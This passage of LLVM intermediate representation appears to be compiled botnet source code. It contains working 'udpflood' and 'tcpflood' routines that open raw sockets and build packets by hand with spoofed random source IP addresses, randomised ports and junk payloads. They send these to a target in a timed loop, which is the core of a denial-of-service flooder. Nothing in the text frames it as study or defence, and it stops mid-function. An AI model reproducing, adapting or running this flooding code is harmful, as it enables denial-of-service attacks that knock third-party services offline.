  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @getHost(i8* %0, %struct.in_addr* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #11
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

12:                                               ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

13:                                               ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

14:                                               ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @filter(i8* %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

3:                                                ; preds = %23, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = call i64 @strlen(i8* %5) #12
  %7 = sub i64 %6, 1
  %8 = getelementptr inbounds i8, i8* %4, i64 %7
  %9 = load i8, i8* %8, align 1
  %10 = sext i8 %9 to i32
  %11 = icmp eq i32 %10, 13
  br i1 %11, label %21, label %12

12:                                               ; preds = %3
  %13 = load i8*, i8** %2, align 8
  %14 = load i8*, i8** %2, align 8
  %15 = call i64 @strlen(i8* %14) #12
  %16 = sub i64 %15, 1
  %17 = getelementptr inbounds i8, i8* %13, i64 %16
  %18 = load i8, i8* %17, align 1
  %19 = sext i8 %18 to i32
  %20 = icmp eq i32 %19, 10
  br label %21

21:                                               ; preds = %12, %3
  %22 = phi i1 [ true, %3 ], [ %20, %12 ]
  br i1 %22, label %23, label %29

23:                                               ; preds = %21
  %24 = load i8*, i8** %2, align 8
  %25 = load i8*, i8** %2, align 8
  %26 = call i64 @strlen(i8* %25) #12
  %27 = sub i64 %26, 1
  %28 = getelementptr inbounds i8, i8* %24, i64 %27
  store i8 0, i8* %28, align 1
  br label %3, !llvm.loop !11

29:                                               ; preds = %21
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8*) #4

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @makestring() #0 {
  %1 = alloca i8*, align 8
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [1024 x i8], align 16
  %8 = call i32 @rand() #11
  %9 = srem i32 %8, 5
  %10 = add nsw i32 %9, 4
  store i32 %10, i32* %2, align 4
  %11 = load i32, i32* %2, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = call noalias align 16 i8* @malloc(i64 %13) #11
  store i8* %14, i8** %1, align 8
  %15 = load i8*, i8** %1, align 8
  %16 = load i32, i32* %2, align 4
  %17 = add nsw i32 %16, 1
  %18 = sext i32 %17 to i64
  call void @llvm.memset.p0i8.i64(i8* align 1 %15, i8 0, i64 %18, i1 false)
  %19 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.40, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i64 0, i64 0))
  store %struct._IO_FILE* %19, %struct._IO_FILE** %4, align 8
  %20 = icmp eq %struct._IO_FILE* %19, null
  br i1 %20, label %21, label %39

21:                                               ; preds = %0
  store i32 0, i32* %3, align 4
  br label %22

22:                                               ; preds = %35, %21
  %23 = load i32, i32* %3, align 4
  %24 = load i32, i32* %2, align 4
  %25 = icmp slt i32 %23, %24
  br i1 %25, label %26, label %38

26:                                               ; preds = %22
  %27 = call i32 @rand() #11
  %28 = srem i32 %27, 26
  %29 = add nsw i32 %28, 65
  %30 = trunc i32 %29 to i8
  %31 = load i8*, i8** %1, align 8
  %32 = load i32, i32* %3, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  store i8 %30, i8* %34, align 1
  br label %35

35:                                               ; preds = %26
  %36 = load i32, i32* %3, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %3, align 4
  br label %22, !llvm.loop !12

38:                                               ; preds = %22
  br label %68

39:                                               ; preds = %0
  %40 = call i32 @rand() #11
  %41 = call i32 @rand() #11
  %42 = mul nsw i32 %40, %41
  %43 = srem i32 %42, 45402
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* %6, align 4
  store i32 0, i32* %3, align 4
  br label %45

45:                                               ; preds = %53, %39
  %46 = load i32, i32* %3, align 4
  %47 = load i32, i32* %6, align 4
  %48 = icmp slt i32 %46, %47
  br i1 %48, label %49, label %56

49:                                               ; preds = %45
  %50 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %51 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %52 = call i8* @fgets(i8* %50, i32 1024, %struct._IO_FILE* %51)
  br label %53

53:                                               ; preds = %49
  %54 = load i32, i32* %3, align 4
  %55 = add nsw i32 %54, 1
  store i32 %55, i32* %3, align 4
  br label %45, !llvm.loop !13

56:                                               ; preds = %45
  %57 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %57, i8 0, i64 1024, i1 false)
  %58 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %59 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %60 = call i8* @fgets(i8* %58, i32 1024, %struct._IO_FILE* %59)
  %61 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  call void @filter(i8* %61)
  %62 = load i8*, i8** %1, align 8
  %63 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %64 = load i32, i32* %2, align 4
  %65 = sext i32 %64 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %62, i8* align 16 %63, i64 %65, i1 false)
  %66 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %67 = call i32 @fclose(%struct._IO_FILE* %66)
  br label %68

68:                                               ; preds = %56, %38
  %69 = load i8*, i8** %1, align 8
  ret i8* %69
}

; Function Attrs: nounwind
declare i32 @rand() #2

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #5

declare noalias %struct._IO_FILE* @fopen(i8*, i8*) #6

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #6

declare i32 @fclose(%struct._IO_FILE*) #6

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @udpflood(i8* %0, i32 %1, i32 %2, i32 %3) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i64, align 8
  %23 = alloca %struct.iphdr*, align 8
  %24 = alloca %struct.udphdr*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 10, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %6, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

30:                                               ; preds = %4
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

34:                                               ; preds = %4
  %35 = load i32, i32* %6, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #10
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

39:                                               ; preds = %34, %30
  %40 = load i8*, i8** %5, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

44:                                               ; preds = %39
  br label %258

45:                                               ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %47, i8 0, i64 8, i1 false)
  %48 = load i32, i32* %9, align 4
  store i32 %48, i32* %12, align 4
  %49 = load i32, i32* %10, align 4
  %50 = icmp eq i32 %49, 32
  br i1 %50, label %51, label %104

51:                                               ; preds = %45
  %52 = call i32 @socket(i32 2, i32 2, i32 17) #11
  store i32 %52, i32* %13, align 4
  %53 = load i32, i32* %13, align 4
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %56, label %55

55:                                               ; preds = %51
  br label %258

56:                                               ; preds = %51
  %57 = load i32, i32* %8, align 4
  %58 = add nsw i32 %57, 1
  %59 = sext i32 %58 to i64
  %60 = call noalias align 16 i8* @malloc(i64 %59) #11
  store i8* %60, i8** %14, align 8
  %61 = load i8*, i8** %14, align 8
  %62 = icmp eq i8* %61, null
  br i1 %62, label %63, label %64

63:                                               ; preds = %56
  br label %258

64:                                               ; preds = %56
  %65 = load i8*, i8** %14, align 8
  %66 = load i32, i32* %8, align 4
  %67 = add nsw i32 %66, 1
  %68 = sext i32 %67 to i64
  call void @llvm.memset.p0i8.i64(i8* align 1 %65, i8 0, i64 %68, i1 false)
  %69 = load i8*, i8** %14, align 8
  %70 = load i32, i32* %8, align 4
  call void @makeRandomStr(i8* %69, i32 %70)
  %71 = call i64 @time(i64* null) #11
  %72 = load i32, i32* %7, align 4
  %73 = sext i32 %72 to i64
  %74 = add nsw i64 %71, %73
  %75 = trunc i64 %74 to i32
  store i32 %75, i32* %15, align 4
  store i32 0, i32* %16, align 4
  br label %76

76:                                               ; preds = %64, %99, %100
  %77 = load i32, i32* %13, align 4
  %78 = load i8*, i8** %14, align 8
  %79 = load i32, i32* %8, align 4
  %80 = sext i32 %79 to i64
  %81 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %82 = call i64 @sendto(i32 %77, i8* %78, i64 %80, i32 0, %struct.sockaddr* %81, i32 16)
  %83 = load i32, i32* %16, align 4
  %84 = load i32, i32* %12, align 4
  %85 = icmp eq i32 %83, %84
  br i1 %85, label %86, label %100

86:                                               ; preds = %76
  %87 = load i32, i32* %6, align 4
  %88 = icmp eq i32 %87, 0
  br i1 %88, label %89, label %93

89:                                               ; preds = %86
  %90 = call i32 @rand_cmwc()
  %91 = trunc i32 %90 to i16
  %92 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %91, i16* %92, align 2
  br label %93

93:                                               ; preds = %89, %86
  %94 = call i64 @time(i64* null) #11
  %95 = load i32, i32* %15, align 4
  %96 = sext i32 %95 to i64
  %97 = icmp sgt i64 %94, %96
  br i1 %97, label %98, label %99

98:                                               ; preds = %93
  br label %103

99:                                               ; preds = %93
  store i32 0, i32* %16, align 4
  br label %76

100:                                              ; preds = %76
  %101 = load i32, i32* %16, align 4
  %102 = add i32 %101, 1
  store i32 %102, i32* %16, align 4
  br label %76

103:                                              ; preds = %98
  br label %258

104:                                              ; preds = %45
  %105 = call i32 @socket(i32 2, i32 3, i32 17) #11
  store i32 %105, i32* %17, align 4
  %106 = load i32, i32* %17, align 4
  %107 = icmp ne i32 %106, 0
  br i1 %107, label %109, label %108

108:                                              ; preds = %104
  br label %258

109:                                              ; preds = %104
  store i32 1, i32* %18, align 4
  %110 = load i32, i32* %17, align 4
  %111 = bitcast i32* %18 to i8*
  %112 = call i32 @setsockopt(i32 %110, i32 0, i32 3, i8* %111, i32 4) #11
  %113 = icmp slt i32 %112, 0
  br i1 %113, label %114, label %115

114:                                              ; preds = %109
  br label %258

115:                                              ; preds = %109
  store i32 50, i32* %19, align 4
  br label %116

116:                                              ; preds = %120, %115
  %117 = load i32, i32* %19, align 4
  %118 = add nsw i32 %117, -1
  store i32 %118, i32* %19, align 4
  %119 = icmp ne i32 %117, 0
  br i1 %119, label %120, label %127

120:                                              ; preds = %116
  %121 = call i64 @time(i64* null) #11
  %122 = call i32 @rand_cmwc()
  %123 = zext i32 %122 to i64
  %124 = xor i64 %121, %123
  %125 = trunc i64 %124 to i32
  call void @srand(i32 %125) #11
  %126 = call i32 @rand() #11
  call void @init_rand(i32 %126)
  br label %116, !llvm.loop !14

127:                                              ; preds = %116
  %128 = load i32, i32* %10, align 4
  %129 = icmp eq i32 %128, 0
  br i1 %129, label %130, label %131

130:                                              ; preds = %127
  store i32 0, i32* %20, align 4
  br label %137

131:                                              ; preds = %127
  %132 = load i32, i32* %10, align 4
  %133 = sub nsw i32 32, %132
  %134 = shl i32 1, %133
  %135 = sub nsw i32 %134, 1
  %136 = xor i32 %135, -1
  store i32 %136, i32* %20, align 4
  br label %137

137:                                              ; preds = %131, %130
  %138 = load i32, i32* %8, align 4
  %139 = sext i32 %138 to i64
  %140 = add i64 28, %139
  %141 = call i8* @llvm.stacksave()
  store i8* %141, i8** %21, align 8
  %142 = alloca i8, i64 %140, align 16
  store i64 %140, i64* %22, align 8
  %143 = bitcast i8* %142 to %struct.iphdr*
  store %struct.iphdr* %143, %struct.iphdr** %23, align 8
  %144 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %145 = bitcast %struct.iphdr* %144 to i8*
  %146 = getelementptr i8, i8* %145, i64 20
  %147 = bitcast i8* %146 to %struct.udphdr*
  store %struct.udphdr* %147, %struct.udphdr** %24, align 8
  %148 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %149 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %150 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %149, i32 0, i32 0
  %151 = load i32, i32* %150, align 4
  %152 = load i32, i32* %20, align 4
  %153 = call i32 @getRandomIP(i32 %152)
  %154 = call i32 @htonl(i32 %153) #10
  %155 = load i32, i32* %8, align 4
  %156 = sext i32 %155 to i64
  %157 = add i64 8, %156
  %158 = trunc i64 %157 to i32
  call void @makeIPPacket(%struct.iphdr* %148, i32 %151, i32 %154, i8 zeroext 17, i32 %158)
  %159 = load i32, i32* %8, align 4
  %160 = sext i32 %159 to i64
  %161 = add i64 8, %160
  %162 = trunc i64 %161 to i16
  %163 = call zeroext i16 @htons(i16 zeroext %162) #10
  %164 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %165 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %164, i32 0, i32 2
  store i16 %163, i16* %165, align 2
  %166 = call i32 @rand_cmwc()
  %167 = trunc i32 %166 to i16
  %168 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %169 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %168, i32 0, i32 0
  store i16 %167, i16* %169, align 2
  %170 = load i32, i32* %6, align 4
  %171 = icmp eq i32 %170, 0
  br i1 %171, label %172, label %174

172:                                              ; preds = %137
  %173 = call i32 @rand_cmwc()
  br label %179

174:                                              ; preds = %137
  %175 = load i32, i32* %6, align 4
  %176 = trunc i32 %175 to i16
  %177 = call zeroext i16 @htons(i16 zeroext %176) #10
  %178 = zext i16 %177 to i32
  br label %179

179:                                              ; preds = %174, %172
  %180 = phi i32 [ %173, %172 ], [ %178, %174 ]
  %181 = trunc i32 %180 to i16
  %182 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %183 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %182, i32 0, i32 1
  store i16 %181, i16* %183, align 2
  %184 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %185 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %184, i32 0, i32 3
  store i16 0, i16* %185, align 2
  %186 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %187 = bitcast %struct.udphdr* %186 to i8*
  %188 = getelementptr inbounds i8, i8* %187, i64 8
  %189 = load i32, i32* %8, align 4
  call void @makeRandomStr(i8* %188, i32 %189)
  %190 = bitcast i8* %142 to i16*
  %191 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 2
  %193 = load i16, i16* %192, align 2
  %194 = zext i16 %193 to i32
  %195 = call zeroext i16 @csum(i16* %190, i32 %194)
  %196 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 7
  store i16 %195, i16* %197, align 2
  %198 = call i64 @time(i64* null) #11
  %199 = load i32, i32* %7, align 4
  %200 = sext i32 %199 to i64
  %201 = add nsw i64 %198, %200
  %202 = trunc i64 %201 to i32
  store i32 %202, i32* %25, align 4
  store i32 0, i32* %26, align 4
  br label %203

203:                                              ; preds = %253, %252, %179
  br label %204

204:                                              ; preds = %203
  %205 = load i32, i32* %17, align 4
  %206 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %207 = call i64 @sendto(i32 %205, i8* %142, i64 %140, i32 0, %struct.sockaddr* %206, i32 16)
  %208 = call i32 @rand_cmwc()
  %209 = trunc i32 %208 to i16
  %210 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %211 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %210, i32 0, i32 0
  store i16 %209, i16* %211, align 2
  %212 = load i32, i32* %6, align 4
  %213 = icmp eq i32 %212, 0
  br i1 %213, label %214, label %216

214:                                              ; preds = %204
  %215 = call i32 @rand_cmwc()
  br label %221

216:                                              ; preds = %204
  %217 = load i32, i32* %6, align 4
  %218 = trunc i32 %217 to i16
  %219 = call zeroext i16 @htons(i16 zeroext %218) #10
  %220 = zext i16 %219 to i32
  br label %221

221:                                              ; preds = %216, %214
  %222 = phi i32 [ %215, %214 ], [ %220, %216 ]
  %223 = trunc i32 %222 to i16
  %224 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %225 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %224, i32 0, i32 1
  store i16 %223, i16* %225, align 2
  %226 = call i32 @rand_cmwc()
  %227 = trunc i32 %226 to i16
  %228 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %229 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %228, i32 0, i32 3
  store i16 %227, i16* %229, align 4
  %230 = load i32, i32* %20, align 4
  %231 = call i32 @getRandomIP(i32 %230)
  %232 = call i32 @htonl(i32 %231) #10
  %233 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %234 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %233, i32 0, i32 8
  store i32 %232, i32* %234, align 4
  %235 = bitcast i8* %142 to i16*
  %236 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %237 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %236, i32 0, i32 2
  %238 = load i16, i16* %237, align 2
  %239 = zext i16 %238 to i32
  %240 = call zeroext i16 @csum(i16* %235, i32 %239)
  %241 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %242 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %241, i32 0, i32 7
  store i16 %240, i16* %242, align 2
  %243 = load i32, i32* %26, align 4
  %244 = load i32, i32* %12, align 4
  %245 = icmp eq i32 %243, %244
  br i1 %245, label %246, label %253

246:                                              ; preds = %221
  %247 = call i64 @time(i64* null) #11
  %248 = load i32, i32* %25, align 4
  %249 = sext i32 %248 to i64
  %250 = icmp sgt i64 %247, %249
  br i1 %250, label %251, label %252

251:                                              ; preds = %246
  br label %256

252:                                              ; preds = %246
  store i32 0, i32* %26, align 4
  br label %203

253:                                              ; preds = %221
  %254 = load i32, i32* %26, align 4
  %255 = add i32 %254, 1
  store i32 %255, i32* %26, align 4
  br label %203

256:                                              ; preds = %251
  %257 = load i8*, i8** %21, align 8
  call void @llvm.stackrestore(i8* %257)
  br label %258

258:                                              ; preds = %44, %55, %63, %108, %114, %256, %103
  ret void
}

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #1

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #2

; Function Attrs: nounwind
declare i64 @time(i64*) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #6

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #2

; Function Attrs: nounwind
declare void @srand(i32) #2

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #7

; Function Attrs: nounwind readnone willreturn
declare i32 @htonl(i32) #1

; Function Attrs: nofree nosync nounwind willreturn
declare void @llvm.stackrestore(i8*) #7

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @tcpflood(i8* %0, i32 %1, i32 %2, i32 %3, i8* %4) #0 {
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i8*, align 8
  %19 = alloca i64, align 8
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.tcphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  store i8* %4, i8** %10, align 8
  store i32 32, i32* %11, align 4
  store i32 10, i32* %12, align 4
  %25 = load i32, i32* %12, align 4
  store i32 %25, i32* %13, align 4
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %26, align 4
  %27 = load i32, i32* %7, align 4
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %33

29:                                               ; preds = %5
  %30 = call i32 @rand_cmwc()
  %31 = trunc i32 %30 to i16
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %31, i16* %32, align 2
  br label %38

33:                                               ; preds = %5
  %34 = load i32, i32* %7, align 4
  %35 = trunc i32 %34 to i16
  %36 = call zeroext i16 @htons(i16 zeroext %35) #10
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %36, i16* %37, align 2
  br label %38

38:                                               ; preds = %33, %29
  %39 = load i8*, i8** %6, align 8
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %41 = call i32 @getHost(i8* %39, %struct.in_addr* %40)
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %43, label %44

43:                                               ; preds = %38
  br label %336

44:                                               ; preds = %38
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 3
  %46 = getelementptr inbounds [8 x i8], [8 x i8]* %45, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %46, i8 0, i64 8, i1 false)
  %47 = call i32 @socket(i32 2, i32 3, i32 6) #11
  store i32 %47, i32* %15, align 4
  %48 = load i32, i32* %15, align 4
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %51, label %50

50:                                               ; preds = %44
  br label %336

51:                                               ; preds = %44
  store i32 1, i32* %16, align 4
  %52 = load i32, i32* %15, align 4
  %53 = bitcast i32* %16 to i8*
  %54 = call i32 @setsockopt(i32 %52, i32 0, i32 3, i8* %53, i32 4) #11
  %55 = icmp slt i32 %54, 0
  br i1 %55, label %56, label %57

56:                                               ; preds = %51
  br label %336

57:                                               ; preds = %51
  %58 = load i32, i32* %11, align 4
  %59 = icmp eq i32 %58, 0
  br i1 %59, label %60, label %61

60:                                               ; preds = %57
  store i32 0, i32* %17, align 4
  br label %67

61:                                               ; preds = %57
  %62 = load i32, i32* %11, align 4
  %63 = sub nsw i32 32, %62
  %64 = shl i32 1, %63
  %65 = sub nsw i32 %64, 1
  %66 = xor i32 %65, -1
  store i32 %66, i32* %17, align 4
  br label %67

67:                                               ; preds = %61, %60
  %68 = load i32, i32* %9, align 4
  %69 = sext i32 %68 to i64
  %70 = add i64 40, %69
  %71 = call i8* @llvm.stacksave()
  store i8* %71, i8** %18, align 8
  %72 = alloca i8, i64 %70, align 16
  store i64 %70, i64* %19, align 8
  %73 = bitcast i8* %72 to %struct.iphdr*
  store %struct.iphdr* %73, %struct.iphdr** %20, align 8
  %74 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %75 = bitcast %struct.iphdr* %74 to i8*
  %76 = getelementptr i8, i8* %75, i64 20
  %77 = bitcast i8* %76 to %struct.tcphdr*
  store %struct.tcphdr* %77, %struct.tcphdr** %21, align 8
  %78 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %79 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %80 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %79, i32 0, i32 0
  %81 = load i32, i32* %80, align 4
  %82 = load i32, i32* %17, align 4
  %83 = call i32 @getRandomIP(i32 %82)
  %84 = call i32 @htonl(i32 %83) #10
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = add i64 20, %86
  %88 = trunc i64 %87 to i32
  call void @makeIPPacket(%struct.iphdr* %78, i32 %81, i32 %84, i8 zeroext 6, i32 %88)
  %89 = call i32 @rand_cmwc()
  %90 = trunc i32 %89 to i16
  %91 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %92 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %91, i32 0, i32 0
  %93 = bitcast %union.anon* %92 to %struct.anon.0*
  %94 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %93, i32 0, i32 0
  store i16 %90, i16* %94, align 4
  %95 = call i32 @rand_cmwc()
  %96 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %97 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %96, i32 0, i32 0
  %98 = bitcast %union.anon* %97 to %struct.anon.0*
  %99 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %98, i32 0, i32 2
  store i32 %95, i32* %99, align 4
  %100 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %101 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %100, i32 0, i32 0
  %102 = bitcast %union.anon* %101 to %struct.anon.0*
  %103 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %102, i32 0, i32 3
  store i32 0, i32* %103, align 4
  %104 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %105 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %104, i32 0, i32 0
  %106 = bitcast %union.anon* %105 to %struct.anon.0*
  %107 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %106, i32 0, i32 4
  %108 = load i16, i16* %107, align 4
  %109 = and i16 %108, -241
  %110 = or i16 %109, 80
  store i16 %110, i16* %107, align 4
  %111 = load i8*, i8** %10, align 8
  %112 = call i32 @strcmp(i8* %111, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.42, i64 0, i64 0)) #12
  %113 = icmp ne i32 %112, 0
  br i1 %113, label %150, label %114

114:                                              ; preds = %67
  %115 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %116 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %115, i32 0, i32 0
  %117 = bitcast %union.anon* %116 to %struct.anon.0*
  %118 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %117, i32 0, i32 4
  %119 = load i16, i16* %118, align 4
  %120 = and i16 %119, -513
  %121 = or i16 %120, 512
  store i16 %121, i16* %118, align 4
  %122 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %123 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %122, i32 0, i32 0
  %124 = bitcast %union.anon* %123 to %struct.anon.0*
